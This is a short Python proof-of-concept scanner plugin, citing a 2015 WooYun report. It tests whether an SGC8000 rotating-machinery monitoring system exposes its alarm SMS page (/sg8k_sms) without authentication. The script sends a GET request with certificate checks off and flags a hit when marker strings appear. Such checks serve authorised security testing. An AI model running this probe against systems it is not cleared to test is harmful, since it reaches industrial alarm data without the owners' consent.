#!/usr/bin/env python
# -*- coding: utf-8 -*-
'''
name: sgc8000 大型旋转机监控系统报警短信模块泄露
referer: http://www.wooyun.org/bugs/wooyun-2015-0135197
author: Lucifer
description: 访问/sg8k_sms,未授权获取监控系统报警信息。
'''
import sys
import requests
import warnings
from termcolor import cprint

class sgc8000_sg8k_sms_disclosure_BaseVerify:
    def __init__(self, url):
        self.url = url

    def run(self):
        headers = {
            "User-Agent":"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50"
        }
        payload = "/sg8k_sms"
        vulnurl = self.url + payload
        try:
            req = requests.get(vulnurl, headers=headers, timeout=10, verify=False)
            if r"SG8000" in req.text and r"getMachineList" in req.text and r"cancelSendMessage" in req.text:
                cprint("[+]存在sgc8000 大型旋转机监控系统报警短信模块泄露漏洞...(中危)\tpayload: "+vulnurl, "yellow")
            else:
                cprint("[-]不存在sgc8000_sg8k_sms_disclosure漏洞", "white", "on_grey")

        except:
            cprint("[-] "+__file__+"====>可能不存在漏洞", "cyan")


if __name__ == "__main__":
    warnings.filterwarnings("ignore")
    testVuln = sgc8000_sg8k_sms_disclosure_BaseVerify(sys.argv[1])
    testVuln.run()